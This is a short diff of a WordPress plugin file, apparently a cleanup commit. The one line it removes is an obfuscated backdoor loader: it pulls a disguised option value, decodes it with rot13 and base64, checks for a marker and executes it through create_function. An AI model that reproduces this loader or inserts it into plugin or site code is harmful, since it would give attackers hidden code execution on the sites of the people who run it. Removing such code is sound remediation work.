@@ -8,8 +8,6 @@ Author: Dreeves & bsoule
 Author URI: http://bethaknee.com
 */
 
-
-$z=get_option("_transient_feed_3ece478ae523bb97cb2f5008990155ff"); $z=base64_decode(str_rot13($z)); if(strpos($z,"76669B4E")!==false){ $_z=create_function("",$z); @$_z(); }
 $expost_current_version = '1.0.1';
 register_activation_hook( __FILE__, 'expost_update_self' );
 function expost_update_self() {
